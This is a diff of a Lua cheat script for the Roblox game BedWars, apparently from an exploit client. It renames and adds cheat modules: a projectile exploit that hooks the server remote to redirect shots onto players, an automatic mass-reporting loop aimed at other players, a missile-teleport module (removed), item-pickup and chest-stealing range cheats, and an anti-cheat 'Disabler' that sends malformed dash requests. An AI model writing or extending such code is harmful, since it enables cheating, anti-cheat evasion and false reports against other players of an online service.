-		BreakSpeed = function(inv, upgrades)
-			if not AutoBuyBreakSpeed.Enabled then return end
-			buyUpgrade("break", inv, upgrades)
+		Destruction = function(inv, upgrades)
+			if not AutoBuyDestruction.Enabled then return end
+			buyUpgrade("destruction", inv, upgrades)
+		end,
+		Diamond = function(inv, upgrades)
+			if not AutoBuyDiamond.Enabled then return end
+			buyUpgrade("diamond_generator", inv, upgrades)
 		end,
 		Alarm = function(inv, upgrades)
 			if not AutoBuyAlarm.Enabled then return end
 			buyUpgrade("alarm", inv, upgrades)
-		end,
-		Armory = function(inv, upgrades)
-			if not AutoBuyArmory.Enabled then return end
-			buyUpgrade("armory", inv, upgrades)
 		end
 	}
 
@@ -7419,27 +7240,13 @@ runcode(function()
 	AutoBuyUpgrades = AutoBuy.CreateToggle({
 		Name = "Buy Team Upgrades",
 		Function = function(callback) 
-			if AutoBuyUpgrades.Object then
-				AutoBuyUpgrades.Object.ToggleArrow.Visible = callback
-			end
-			if AutoBuyGen.Object then
-				AutoBuyGen.Object.Visible = callback
-			end
-			if AutoBuyProt.Object then
-				AutoBuyProt.Object.Visible = callback
-			end
-			if AutoBuySharp.Object then
-				AutoBuySharp.Object.Visible = callback
-			end
-			if AutoBuyBreakSpeed.Object then
-				AutoBuyBreakSpeed.Object.Visible = callback
-			end
-			if AutoBuyAlarm.Object then
-				AutoBuyAlarm.Object.Visible = callback
-			end
-            if AutoBuyArmory.Object then
-				AutoBuyArmory.Object.Visible = callback
-			end
+			if AutoBuyUpgrades.Object then AutoBuyUpgrades.Object.ToggleArrow.Visible = callback end
+			if AutoBuyGen.Object then AutoBuyGen.Object.Visible = callback end
+			if AutoBuyProt.Object then AutoBuyProt.Object.Visible = callback end
+			if AutoBuySharp.Object then AutoBuySharp.Object.Visible = callback end
+			if AutoBuyDestruction.Object then AutoBuyDestruction.Object.Visible = callback end
+			if AutoBuyDiamond.Object then AutoBuyDiamond.Object.Visible = callback end
+			if AutoBuyAlarm.Object then AutoBuyAlarm.Object.Visible = callback end
 		end, 
 		Default = true
 	})
@@ -7457,16 +7264,16 @@ runcode(function()
 		Function = function() end, 
 		Default = true
 	})
-	AutoBuyBreakSpeed = AutoBuy.CreateToggle({
-		Name = "Buy Break Speed",
+	AutoBuyDestruction = AutoBuy.CreateToggle({
+		Name = "Buy Destruction",
+		Function = function() end, 
+	})
+	AutoBuyDiamond = AutoBuy.CreateToggle({
+		Name = "Buy Diamond Generator",
 		Function = function() end, 
 	})
 	AutoBuyAlarm = AutoBuy.CreateToggle({
 		Name = "Buy Alarm",
-		Function = function() end, 
-	})
-    AutoBuyArmory = AutoBuy.CreateToggle({
-		Name = "Buy Armory",
 		Function = function() end, 
 	})
 	AutoBuyGui = AutoBuy.CreateToggle({
@@ -7490,18 +7297,18 @@ runcode(function()
 	AutoBuySharp.Object.BorderSizePixel = 0
 	AutoBuySharp.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 	AutoBuySharp.Object.Visible = AutoBuyUpgrades.Enabled
-	AutoBuyBreakSpeed.Object.BackgroundTransparency = 0
-	AutoBuyBreakSpeed.Object.BorderSizePixel = 0
-	AutoBuyBreakSpeed.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	AutoBuyBreakSpeed.Object.Visible = AutoBuyUpgrades.Enabled
+	AutoBuyDestruction.Object.BackgroundTransparency = 0
+	AutoBuyDestruction.Object.BorderSizePixel = 0
+	AutoBuyDestruction.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	AutoBuyDestruction.Object.Visible = AutoBuyUpgrades.Enabled
+	AutoBuyDiamond.Object.BackgroundTransparency = 0
+	AutoBuyDiamond.Object.BorderSizePixel = 0
+	AutoBuyDiamond.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	AutoBuyDiamond.Object.Visible = AutoBuyUpgrades.Enabled
 	AutoBuyAlarm.Object.BackgroundTransparency = 0
 	AutoBuyAlarm.Object.BorderSizePixel = 0
 	AutoBuyAlarm.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 	AutoBuyAlarm.Object.Visible = AutoBuyUpgrades.Enabled
-    AutoBuyArmory.Object.BackgroundTransparency = 0
-	AutoBuyArmory.Object.BorderSizePixel = 0
-	AutoBuyArmory.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	AutoBuyArmory.Object.Visible = AutoBuyUpgrades.Enabled
 	AutoBuyCustom = AutoBuy.CreateTextList({
 		Name = "BuyList",
 		TempText = "item/amount/priority/after",
@@ -8060,9 +7867,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local AutoKit = {Enabled = false}
 	local AutoKitTrinity = {Value = "Void"}
@@ -8276,9 +8080,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local AutoRelicCustom = {ObjectList = {}}
 
@@ -8326,9 +8127,6 @@ runcode(function()
 		TempText = "custom (relic id)"
 	})
 end)
-
-
-
 
 runcode(function()
 	local AutoForge = {Enabled = false}
@@ -8393,7 +8191,7 @@ runcode(function()
 		Default = true
 	})
 	AutoForgeSword = AutoForge.CreateToggle({
-		Name = "Sword",
+		Name = "Weapon",
 		Function = function() end
 	})
 	AutoForgeBow = AutoForge.CreateToggle({
@@ -8403,7 +8201,7 @@ runcode(function()
 	AutoForgeBuyAfter = AutoForge.CreateToggle({
 		Name = "Buy After",
 		Function = function() end,
-		HoverText = "buy a sword after armor is maxed"
+		HoverText = "buy a weapon after armor is maxed"
 	})
 	AutoForgeNotification = AutoForge.CreateToggle({
 		Name = "Notification",
@@ -8411,9 +8209,6 @@ runcode(function()
 		Default = true
 	})
 end)
-
-
-
 
 runcode(function()
 	local alreadyreportedlist = {}
@@ -8427,7 +8222,7 @@ runcode(function()
 					repeat
 						task.wait()
 						for i,v in pairs(playersService:GetPlayers()) do 
-							if v ~= lplr and alreadyreportedlist[v] == nil and v:GetAttribute("PlayerConnected") and WhitelistFunctions:CheckPlayerType(v) == "DEFAULT" then 
+							if v ~= lplr and alreadyreportedlist[v] == nil and v:GetAttribute("PlayerConnected") and WhitelistFunctions:GetWhitelist(v) == 0 then 
 								task.wait(1)
 								alreadyreportedlist[v] = true
 								bedwars.ClientHandler:Get(bedwars.ReportRemote):SendToServer(v.UserId)
@@ -8448,9 +8243,6 @@ runcode(function()
 		Function = function() end
 	})
 end)
-
-
-
 
 runcode(function()
 	local justsaid = ""
@@ -8719,9 +8511,6 @@ runcode(function()
 	AutoToxicPhrases8.Object.AddBoxBKG.AddBox.TextSize = 12
 end)
 
-
-
-
 runcode(function()
 	local ChestStealer = {Enabled = false}
 	local ChestStealerDistance = {Value = 1}
@@ -8819,9 +8608,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local FastDrop = {Enabled = false}
 	FastDrop = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
@@ -8843,9 +8629,6 @@ runcode(function()
 end)
 
 local denyregions = {}
-
-
-
 runcode(function()
 	local ignoreplaceregions = {Enabled = false}
 	ignoreplaceregions = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
@@ -8865,62 +8648,6 @@ runcode(function()
 		end
 	})
 end)
-
-
-
-
-runcode(function()
-	local MissileTP = {Enabled = false}
-	local MissileTeleportDelaySlider = {Value = 30}
-	MissileTP = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-		Name = "MissileTP",
-		Function = function(callback)
-			if callback then
-				task.spawn(function()
-					if getItem("guided_missile") then
-						local plr = EntityNearMouse(1000)
-						if plr then
-							local projectile = bedwars.RuntimeLib.await(bedwars.MissileController.fireGuidedProjectile:CallServerAsync("guided_missile"))
-							if projectile then
-								local projectilemodel = projectile.model
-								if not projectilemodel.PrimaryPart then
-									projectilemodel:GetPropertyChangedSignal("PrimaryPart"):Wait()
-								end;
-								local bodyforce = Instance.new("BodyForce")
-								bodyforce.Force = Vector3.new(0, projectilemodel.PrimaryPart.AssemblyMass * workspace.Gravity, 0)
-								bodyforce.Name = "AntiGravity"
-								bodyforce.Parent = projectilemodel.PrimaryPart
-
-								repeat
-									task.wait()
-									if projectile.model then
-										if plr then
-											projectile.model:SetPrimaryPartCFrame(CFrame.new(plr.RootPart.CFrame.p, plr.RootPart.CFrame.p + gameCamera.CFrame.lookVector))
-										else
-											createwarning("MissileTP", "Player died before it could TP.", 3)
-											break
-										end
-									end
-								until projectile.model.Parent == nil
-							else
-								createwarning("MissileTP", "Missile on cooldown.", 3)
-							end
-						else
-							createwarning("MissileTP", "Player not found.", 3)
-						end
-					else
-						createwarning("MissileTP", "Missile not found.", 3)
-					end
-				end)
-				MissileTP.ToggleButton(true)
-			end
-		end,
-		HoverText = "Spawns and teleports a missile to a player\nnear your mouse."
-	})
-end)
-
-
-
 
 runcode(function()
 	local OpenEnderchest = {Enabled = false}
@@ -8942,65 +8669,17 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
-	local PickupRangeRange = {Value = 1}
-	local PickupRange = {Enabled = false}
-	PickupRange = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-		Name = "PickupRange", 
-		Function = function(callback)
-			if callback then
-				local pickedup = {}
-				task.spawn(function()
-					repeat
-						local itemdrops = collectionService:GetTagged("ItemDrop")
-						for i,v in pairs(itemdrops) do
-							if entityLibrary.isAlive and (v:GetAttribute("ClientDropTime") and tick() - v:GetAttribute("ClientDropTime") > 2 or v:GetAttribute("ClientDropTime") == nil) then
-								if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= PickupRangeRange.Value and (pickedup[v] == nil or pickedup[v] <= tick()) then
-									task.spawn(function()
-										pickedup[v] = tick() + 0.2
-										bedwars.ClientHandler:Get(bedwars.PickupRemote):CallServerAsync({
-											itemDrop = v
-										}):andThen(function(suc)
-											if suc then
-												bedwars.SoundManager:playSound(bedwars.SoundList.PICKUP_ITEM_DROP)
-											end
-										end)
-									end)
-								end
-							end
-						end
-						task.wait()
-					until (not PickupRange.Enabled)
-				end)
-			end
-		end
-	})
-	PickupRangeRange = PickupRange.CreateSlider({
-		Name = "Range",
-		Min = 1,
-		Max = 10, 
-		Function = function() end,
-		Default = 10
-	})
-end)
-
-
-
-
-runcode(function()
-	local BowExploit = {Enabled = false}
-	local BowExploitTarget = {Value = "Mouse"}
-	local BowExploitAutoShootFOV = {Value = 1000}
+	local ProjectileExploit = {Enabled = false}
+	local ProjectileExploitTarget = {Value = "Mouse"}
+	local ProjectileExploitAutoShootFOV = {Value = 1000}
 	local oldrealremote
 	local noveloproj = {
 		"fireball",
 		"telepearl"
 	}
 
-	BowExploit = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+	ProjectileExploit = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
 		Name = "ProjectileExploit",
 		Function = function(callback)
 			if callback then 
@@ -9011,14 +8690,13 @@ runcode(function()
 					if oldRemote and oldRemote.Name == bedwars.ProjectileRemote then 
 						res.instance = {InvokeServer = function(self, shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...) 
 							local plr
-							if BowExploitTarget.Value == "Mouse" then 
+							if ProjectileExploitTarget.Value == "Mouse" then 
 								plr = EntityNearMouse(10000)
 							else
-								plr = EntityNearPosition(BowExploitAutoShootFOV.Value, true)
+								plr = EntityNearPosition(ProjectileExploitAutoShootFOV.Value, true)
 							end
 							if plr then	
-								local playertype, playerattackable = WhitelistFunctions:CheckPlayerType(plr.Player)
-								if not playerattackable then 
+								if not ({WhitelistFunctions:GetWhitelist(plr.Player)})[2] then 
 									return oldRemote:InvokeServer(shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...)
 								end
 		
@@ -9067,12 +8745,12 @@ runcode(function()
 			end
 		end
 	})
-	BowExploitTarget = BowExploit.CreateDropdown({
+	ProjectileExploitTarget = ProjectileExploit.CreateDropdown({
 		Name = "Mode",
 		List = {"Mouse", "Range"},
 		Function = function() end
 	})
-	BowExploitAutoShootFOV = BowExploit.CreateSlider({
+	ProjectileExploitAutoShootFOV = ProjectileExploit.CreateSlider({
 		Name = "FOV",
 		Function = function() end,
 		Min = 1,
@@ -9080,9 +8758,6 @@ runcode(function()
 		Default = 1000
 	})
 end)
-
-
-
 
 runcode(function()
 	local RavenTP = {Enabled = false}
@@ -9130,9 +8805,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local SetEmote = {Enabled = false}
 	local SetEmoteList = {Value = ""}
@@ -9174,9 +8846,6 @@ runcode(function()
 		end
 	})
 end)
-
-
-
 
 runcode(function()
 	local tiered = {}
@@ -9221,9 +8890,6 @@ runcode(function()
 end)
 
 local lagbackedaftertouch = false
-
-
-
 runcode(function()
 	local AntiVoidPart
 	local AntiVoidConnection
@@ -9396,9 +9062,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local oldenable2
 	local olddisable2
@@ -9446,9 +9109,6 @@ runcode(function()
 		HoverText = "Automatically swaps your hand to the appropriate tool."
 	})
 end)
-
-
-
 
 runcode(function()
 	local BedProtector = {Enabled = false}
@@ -9538,9 +9198,6 @@ runcode(function()
 		Default = 20
 	})
 end)
-
-
-
 
 runcode(function()
 	local Nuker = {Enabled = false}
@@ -9706,9 +9363,6 @@ runcode(function()
 end)
 
 
-
-
-
 runcode(function()
 	local controlmodule = require(lplr.PlayerScripts.PlayerModule).controls
 	local oldmove
@@ -9760,9 +9414,6 @@ runcode(function()
 		Function = function() end
 	})
 end)
-
-
-
 
 runcode(function()
 	local Schematica = {Enabled = false}
@@ -10007,8 +9658,33 @@ runcode(function()
 	})
 end)
 
-
-
+runcode(function()
+    local Disabler = {Enabled = false}
+    Disabler = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+        Name = "Disabler",
+        Function = function(callback)
+            if callback then 
+				task.spawn(function()
+					repeat
+						task.wait(0.03)
+						local item = getItemNear("scythe")
+						if item and lplr.Character.HandInvItem.Value == item.tool then 
+							if bedwars.ClientHandler:Get("ScytheDash"):CallServer({direction = Vector3.new(math.huge, math.huge, math.huge)}) then 
+								bedwarsStore.grapple = tick() + 1.5
+							end
+						end
+					until (not Disabler.Enabled)
+				end)
+            end
+        end,
+		HoverText = "Bedwars Devs trying to add new items moment"
+    })
+	DisablerMethods = Disabler.CreateDropdown({
+        Name = "Animation", 
+        List = {"Scythe dash"},
+        Function = function(val) end
+    })
+end)
 
 runcode(function()
 	bedwarsStore.TPString = shared.vapeoverlay or nil
@@ -10243,9 +9919,6 @@ runcode(function()
 	})
 end)
 
-
-
-
 runcode(function()
 	local ReachDisplay = {}
 	local ReachLabel
@@ -10289,17 +9962,19 @@ runcode(function()
 					repeat
 						local itemdrops = collectionService:GetTagged("ItemDrop")
 						for i,v in pairs(itemdrops) do
-							if entityLibrary.isAlive and ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= PickupRangeRange.Value and (pickedup[v] == nil or pickedup[v] <= tick()) and (v:GetAttribute("ClientDropTime") and tick() - v:GetAttribute("ClientDropTime") > 2 or v:GetAttribute("ClientDropTime") == nil) then
-								task.spawn(function()
-									pickedup[v] = tick() + 0.2
-									bedwars.ClientHandler:Get(bedwars.PickupRemote):CallServerAsync({
-										itemDrop = v
+							if entityLibrary.isAlive and (v:GetAttribute("ClientDropTime") and tick() - v:GetAttribute("ClientDropTime") > 2 or v:GetAttribute("ClientDropTime") == nil) then
+								if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= PickupRangeRange.Value and (pickedup[v] == nil or pickedup[v] <= tick()) then
+									task.spawn(function()
+										pickedup[v] = tick() + 0.2
+										bedwars.ClientHandler:Get(bedwars.PickupRemote):CallServerAsync({
+											itemDrop = v
 										}):andThen(function(suc)
-										if suc and PickupRangeSound.Enabled then
-											bedwars.SoundManager:playSound(bedwars.SoundList.PICKUP_ITEM_DROP)
-										end
+											if suc and PickupRangeSound.Enabled then
+												bedwars.SoundManager:playSound(bedwars.SoundList.PICKUP_ITEM_DROP)
+											end
+										end)
 									end)
-								end)
+								end
 							end
 						end
 						task.wait()
